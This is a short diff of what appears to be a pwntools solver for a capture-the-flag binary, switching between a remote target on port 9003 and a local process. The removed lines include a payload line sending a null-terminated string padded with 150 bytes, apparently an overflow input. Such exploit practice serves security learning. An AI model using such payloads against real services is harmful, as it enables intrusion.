@@ -5,6 +5,4 @@ if args.REMOTE:
     port = 9003
     p = remote(host, port)
 else:
-    p = process("./static/oppenheimers-research-2")
-p.sendline(b'A\x00' + b'_' * 150)
-p.interactive()
+    p = process("./oppenheimers-research-2")
